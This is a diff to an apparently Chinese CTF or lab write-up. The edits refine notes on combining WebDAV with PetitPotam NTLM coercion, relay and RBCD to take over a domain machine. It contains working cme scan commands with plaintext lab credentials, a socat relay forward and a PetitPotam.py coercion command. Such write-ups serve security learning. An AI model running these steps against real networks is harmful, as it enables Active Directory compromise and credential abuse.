@@ -183,7 +183,7 @@ creds_all
 
 # flag3
 
-可以用cme去看内网开启了什么功能，这个看wp才知道去扫webdav和petitpotam，webdav貌似没有用到
+可以用cme去看内网开启了什么功能，这个看wp才知道去扫webdav和petitpotam，webdav可以拓宽petitpotam的攻击面，通过WebDav进行NTLM Relay的好处在于可以不受到协议签名的影响，对本地内部网或受信任的站点自动使用当前用户凭据进行NTLM认证
 
 ```
 cme smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav
@@ -192,7 +192,7 @@ cme smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam
 
 ![image-20241118201710111](images/12.png)
 
-扫到了petitpotam，并且存在辅域控，此时还拿到了两个可用的账户，拿可以配置petitpotam打ntlm的强制认证来配合rbcd拿下win 2008这台机器的权限
+扫到了petitpotam，此时还拿到了两个可用的账户，拿可以配置petitpotam配合webdav打ntlm的强制认证来配合rbcd拿下webdav这台机器的权限
 
 ```
 1、用petitpotam触发目标访问HTTP服务
@@ -231,7 +231,7 @@ nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &
 
 ![image-20241118204042749](images/16.png)
 
-强制认证，ubuntu的80端口，最后流量会转发到本地
+强制认证，ubuntu的80端口，最后流量会转发到本地，此处不可使用ip进行强制认证，使用DNS解析进行强制认证,此处的`@`符号前为主机名，后为端口号
 
 ```
 python3 PetitPotam.py -u yangmei -p 'xrihGHgoNZQ' -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26
@@ -305,3 +305,4 @@ https://forum.butian.net/share/1944
 
 https://zhzhdoai.github.io/2020/02/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8-CVE-2020-1938/
 
+https://cloud.tencent.com/developer/article/2267322?areaSource=102001.14&traceId=_iQlKVfB_eijDszgwHMVs
